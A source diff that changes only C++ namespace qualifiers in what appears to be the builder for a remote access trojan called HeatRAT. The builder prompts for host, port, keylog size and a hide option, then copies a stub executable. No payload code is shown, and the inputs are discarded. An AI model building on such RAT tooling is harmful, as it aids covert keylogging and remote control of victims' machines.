@@ -21,29 +21,29 @@
 
 
 
-void fileCopy(string path, string destination)
+void fileCopy(std::string path, std::string destination)
 {
 	HANDLE  hConsole;
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
-	ifstream firstFile(path.c_str(), ios::binary);
+	std::ifstream firstFile(path.c_str(), std::ios::binary);
 	if (firstFile)
 	{
-		ifstream isDestination(destination.c_str());
+		std::ifstream isDestination(destination.c_str());
 		if (isDestination)
 		{
-			cout << "file already exist, Do you want to replace ? [Yes / No] : ";
-			string choice;
-			cin >> choice;
+			std::cout << "file already exist, Do you want to replace ? [Yes / No] : ";
+			std::string choice;
+			std::cin >> choice;
 			if (choice == "Y" || choice == "yes" || choice == "Yes" || choice == "YES" || choice == "y")
 			{
 				isDestination.close();
-				ofstream destinationFile(destination.c_str(), ios::binary);
-				string line;
+				std::ofstream destinationFile(destination.c_str(), std::ios::binary);
+				std::string line;
 				while (getline(firstFile, line))
 				{
-					destinationFile << line << endl;
+					destinationFile << line << std::endl;
 				}
 				destinationFile.flush();
 				destinationFile.close();
@@ -67,11 +67,11 @@ void fileCopy(string path, string destination)
 		else
 		{
 			isDestination.close();
-			ofstream destinationFile(destination.c_str(), ios::binary);
-			string line;
+			std::ofstream destinationFile(destination.c_str(), std::ios::binary);
+			std::string line;
 			while (getline(firstFile, line))
 			{
-				destinationFile << line << endl;
+				destinationFile << line << std::endl;
 			}
 			destinationFile.flush();
 			destinationFile.close();
@@ -99,10 +99,10 @@ void Build()
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
-	string something = "";
+	std::string something = "";
 	bool openPort = false;
 
-	cout << "\n\n";
+	std::cout << "\n\n";
 
 
 	col = 8;
@@ -110,17 +110,17 @@ void Build()
 	printf("Host: ");
 	col = 11;
 	SetConsoleTextAttribute(hConsole, col);
-	cin >> something;
+	std::cin >> something;
 	col = 8;
 	SetConsoleTextAttribute(hConsole, col);
 	printf("Port: ");
 	col = 11;
 	SetConsoleTextAttribute(hConsole, col);
-	cin >> something;
-	ifstream file(Modules::prefrences);
+	std::cin >> something;
+	std::ifstream file(Modules::prefrences);
 	if (file.is_open())
 	{
-		string line;
+		std::string line;
 		while (getline(file, line))
 		{
 			if (line == something)
@@ -146,21 +146,21 @@ void Build()
 		printf("size KayLogs: ");
 		col = 11;
 		SetConsoleTextAttribute(hConsole, col);
-		cin >> something;
+		std::cin >> something;
 		col = 8;
 		SetConsoleTextAttribute(hConsole, col);
 		printf("Name: ");
 		col = 11;
 		SetConsoleTextAttribute(hConsole, col);
-		cin >> something;
+		std::cin >> something;
 		col = 8;
 		SetConsoleTextAttribute(hConsole, col);
 		printf("hide? (y/n) ");
 		col = 11;
 		SetConsoleTextAttribute(hConsole, col);
-		cin >> something;
+		std::cin >> something;
 		col = 8;
-		cout << "\n";
+		std::cout << "\n";
 		SetConsoleTextAttribute(hConsole, col);
 		printf("building...\n");
 		printf("[");
@@ -180,13 +180,13 @@ void Build()
 		printf("]\n\n");
 
 		fileCopy("resources/stub.exe", "built/HeatRAT.exe");
-		string version = "4.0.0";
-		string log = "built\\log.txt";
+		std::string version = "4.0.0";
+		std::string log = "built\\log.txt";
 		srand(time(0));
-		ofstream file(log, ios::app);
+		std::ofstream file(log, std::ios::app);
 		if (file.is_open())
 		{
-			file << "HeatRAT v"<< version << " builded\nBuild num: "<< 10000000 +  rand() % (99999999 - 10000000 - 1)<< "\nbuild status: success\n===============================" << endl;
+			file << "HeatRAT v"<< version << " builded\nBuild num: "<< 10000000 +  rand() % (99999999 - 10000000 - 1)<< "\nbuild status: success\n===============================" << std::endl;
 		}
 		else
 		{
@@ -210,7 +210,7 @@ void Build()
 	}
 
 
-	cout << "\n\n";
+	std::cout << "\n\n";
 
 }
 
